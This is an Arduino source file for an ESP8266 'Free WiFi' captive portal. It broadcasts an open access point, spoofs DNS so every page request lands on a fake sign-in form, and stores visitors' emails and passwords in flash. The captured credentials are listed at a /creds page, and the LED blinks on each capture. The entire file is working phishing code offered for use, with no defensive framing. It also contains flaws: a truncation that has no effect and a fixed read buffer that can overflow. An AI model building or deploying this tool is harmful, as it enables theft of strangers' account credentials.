// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)
// LittleFS functionality by dsfifty 16 Nov 2022

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

//function prototypes
void readData();
void writeData(String data);
void deleteData();

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() { return 
  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  readData();  //retrieves saved data and adds the new data. The data variable is updated and saved again to LittleFS
  Credentials = data + "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  data = "";
  savedData = 0;
  deleteData();  //deletes the file from LittleFS
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {  // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData()  //reads the file from LittleFS and returns as the string variable called: data
{
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "r");
  //Check if the file exists
  if (!file) {
    return;
  }
  data = "";  //setup for data read
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read());  //file is read one character at a time into the char array
    i++;
  }
  myArray[i] = '\0';  //a null is added at the end
  //Close the file
  file.close();
  data = String(myArray);  //convert the array into a string ready for return
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "w");
  //Write to the file
  file.print(data);
  delay(1);
  //Close the file
  file.close();
}

void deleteData() {
  //Remove the file
  LittleFS.remove("/SavedFile.txt");
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  //LittleFS set up
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  //Read the saved data every boot
  readData();

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}